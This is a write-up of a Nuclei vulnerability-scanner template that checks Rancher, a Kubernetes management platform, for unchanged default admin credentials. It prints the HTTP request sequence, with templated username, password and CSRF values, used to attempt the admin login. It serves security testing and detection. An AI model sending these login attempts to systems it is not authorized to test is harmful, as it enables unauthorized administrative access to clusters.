# Nuclei Template: Rancher Default Login
**Template ID:** rancher-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`rancher-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Rancher default admin credentials were discovered. Rancher is an open-source multi-cluster orchestration platform that lets operations teams deploy, manage and secure enterprise Kubernetes.

## Steps to reproduce / Exploit Payload
```http
GET /v3/settings/first-login HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36

POST /v3-public/localProviders/local?action=login HTTP/1.1
Host: {{Hostname}}
Cookie: CSRF={{csrf}}
X-Api-Csrf: {{csrf}}
Connection: close
Content-Length: 136

{"username":"{{username}}","password":"{{password}}","description":"UI Session","responseType":"cookie","labels":{"ui-session":"true"}}
```

## References
- https://github.com/rancher/rancher
- https://rancher.com/docs/rancher/v2.5/en/admin-settings/authentication/local/
